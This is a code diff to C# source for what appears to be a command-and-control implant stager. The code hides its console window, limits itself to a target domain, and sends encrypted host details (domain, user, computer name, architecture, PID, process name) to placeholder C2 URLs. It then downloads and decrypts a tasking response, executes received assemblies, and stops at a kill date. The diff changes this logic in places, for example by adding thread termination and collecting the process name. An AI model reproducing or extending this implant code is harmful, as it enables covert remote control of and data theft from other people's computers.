@@ -14,32 +14,34 @@ using System.Globalization;
 
 public class Program
 {
-	[DllImport("kernel32.dll")]
-	static extern IntPtr GetConsoleWindow();
-	[DllImport("user32.dll")]
-	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-	[DllImport("shell32.dll")]
-    static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
-	public const int SW_HIDE = 0;
+	public const int SW_HIDEN = 0;
 	public const int SW_SHOW = 5;
-    public static string taskId;
-    public static bool Run = true;
-    private static string pKey;
-    private static int dfs = 0;
+	public static string taskId = "";
+	public static string pKey;
+	public static bool Run = true;
+	static string Pop = "";
+	private static int dfs = 0;
 	private static string[] dfarray = {#REPLACEDF#};
 	public static string[] dfhead = null;
 	private static string[] basearray = {#REPLACEBASEURL#};
 	public static string[] rotate = null;
+	public static IntPtr DllBaseAddress = IntPtr.Zero;
+    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
+    [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-	public static void Sharp()
+	public static void Sharp(long baseAddr=0)
 	{
-		if(!string.IsNullOrEmpty("#REPLACEMEDOMAIN#") && !Environment.UserDomainName.Contains("#REPLACEMEDOMAIN#"))
+		DllBaseAddress = new IntPtr(baseAddr);
+		if(!string.IsNullOrEmpty("#REPLACEMEDOMAIN#") && !Environment.UserDomainName.ToLower().Contains("#REPLACEMEDOMAIN#".ToLower()))
 		{
 			return;
 		}
 
 		var handle = GetConsoleWindow();
-		ShowWindow(handle, SW_HIDE);
+		ShowWindow(handle, SW_HIDEN);
 		AUnTrCrts();
 
 		if(#REPLACESTAGERRETRIES#)
@@ -47,7 +49,7 @@ public class Program
 			int limit = #REPLACESTAGERRETRIESLIMIT#;
 			int waitTime = #REPLACESTAGERRETRIESWAIT# * 1000;
 			var mre = new System.Threading.ManualResetEvent(false);
-			while (true && limit > 0) 
+			while (true && limit > 0)
 			{
 				try {
 					primer();
@@ -63,7 +65,8 @@ public class Program
 		{
 			primer();
 		}
-
+		var x = GetCurrentThread();
+		TerminateThread(x, 0);
 
 	}
 
@@ -104,7 +107,7 @@ public class Program
 	static System.Net.WebClient GetWebRequest(string cookie)
 	{
 		try {
-			ServicePointManager.SecurityProtocol = (SecurityProtocolType)192 |(SecurityProtocolType)768 | (SecurityProtocolType)3072;			
+			ServicePointManager.SecurityProtocol = (SecurityProtocolType)192 |(SecurityProtocolType)768 | (SecurityProtocolType)3072;
 		} catch (Exception e) {
 			Console.WriteLine(e.Message);
 		}
@@ -231,6 +234,7 @@ public class Program
 	{
 		if (DateTime.ParseExact("#REPLACEKILLDATE#", "yyyy-MM-dd", CultureInfo.InvariantCulture) > DateTime.Now)
 		{
+			dfs = 0;
 			var u = "";
 			try
 			{
@@ -244,25 +248,30 @@ public class Program
 			var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
 			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 			int pid = Process.GetCurrentProcess().Id;
+			var procname = Process.GetCurrentProcess().ProcessName;
 			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
 			string x = null;
 			string baseURL = null;
 			foreach (string du in Program.basearray)
 			{
-				var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
-			 	string key = @"#REPLACEKEY#";
-			 	baseURL = du;
-			 	string s = baseURL+"#REPLACESTARTURL#";
+				var o = String.Format("{0};{1};{2};{3};{4};{5};#REPLACEURLID#", dn, u, cn, arch, pid, procname);
+				string key = @"#REPLACEKEY#";
+				baseURL = du;
+				string s = baseURL+"#REPLACESTARTURL#";
 				try {
-				var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
-				x = Decryption(key, primer);
-				}
-				catch (Exception e){}
-				if (x !=null){
+					var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
+					x = Decryption(key, primer);
 					break;
+				}
+				catch (Exception e){
+					Console.WriteLine($" > Exception {e.Message}");
 				}
 				dfs++;
 			}
+			if (String.IsNullOrEmpty(x))
+			{
+				throw new Exception();
+			} 
 			var re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
 			var m = re.Match(x);
 			string RandomURI = m.Groups[1].ToString();
@@ -374,8 +383,8 @@ public class Program
 				catch(NullReferenceException) {}
 				catch(Exception e)
                 {
-                        sOut = "[-] Error running assembly: " + e.Message;
-                        sOut += e.StackTrace;
+                        sOut += "\n[-] Error running assembly: " + e.Message;
+                        sOut += "\n" + e.StackTrace;
                 }
 				break;
 			}
@@ -508,7 +517,7 @@ public class Program
 		{
 			if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
 			{
-				Run = false;
+                Run = false;
 				exitvt.Set();
 				continue;
 			}
